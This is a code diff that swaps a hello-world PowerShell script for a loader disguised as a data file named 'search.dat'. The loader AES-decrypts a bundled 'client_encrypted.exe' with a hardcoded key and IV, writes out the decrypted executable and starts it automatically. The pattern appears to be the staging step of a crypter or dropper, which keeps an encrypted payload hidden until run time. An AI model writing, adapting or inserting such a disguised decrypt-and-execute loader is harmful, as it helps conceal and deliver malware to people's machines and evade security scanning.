@@ -1,1 +1,59 @@
-Write-Host "hello world"
+# search.dat (actually a search.ps1)
+
+# Convert-HexStringToByteArray function (reuse from encryption script)
+function Convert-HexStringToByteArray($hex) {
+    $bytes = @()
+    for ($i = 0; $i -lt $hex.Length; $i += 2) {
+        $bytes += [Convert]::ToByte($hex.Substring($i, 2), 16)
+    }
+    return ,$bytes  # Ensure it's returned as a byte array
+}
+
+# Correctly resolve paths relative to the project hierarchy
+$scriptDir = (Get-Item .).FullName
+$encryptedFilePath = Join-Path $scriptDir "..\..\client\dist\client_encrypted.exe"
+$decryptedFilePath = Join-Path $scriptDir "..\..\client\dist\client_decrypted.exe"
+
+$decryptionKeyHex  = "6B6E6967687463686173657200000000"
+$decryptionKey     = Convert-HexStringToByteArray $decryptionKeyHex
+
+$ivHex             = "576167616D616D6152616B6961000000"
+$iv                = Convert-HexStringToByteArray $ivHex  # Ensure consistent IV conversion
+
+try {
+    # Ensure paths are valid
+    if (-Not (Test-Path $encryptedFilePath)) {
+        Write-Error "Encrypted file not found at: $encryptedFilePath"
+        exit
+    }
+
+    # Read the encrypted file bytes
+    $encryptedData = [System.IO.File]::ReadAllBytes($encryptedFilePath)
+
+    # Create an AES object and decryptor
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $decryptionKey
+    $aes.IV = $iv
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesDecryptor = $aes.CreateDecryptor()
+
+    # Decrypt the data
+    $memoryStream = New-Object System.IO.MemoryStream
+    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $aesDecryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+    $cryptoStream.Write($encryptedData, 0, $encryptedData.Length)
+    $cryptoStream.FlushFinalBlock()
+    $decryptedData = $memoryStream.ToArray()
+    [System.IO.File]::WriteAllBytes($decryptedFilePath, $decryptedData)
+
+    # Cleaning up
+    $memoryStream.Dispose()
+    $cryptoStream.Dispose()
+    $aes.Dispose()
+
+    Write-Host "The decrypted executable is successfully created at $decryptedFilePath"
+
+    # Execute the decrypted file
+    Start-Process -FilePath $decryptedFilePath
+} catch {
+    Write-Error "An error occurred during decryption: $_"
+}
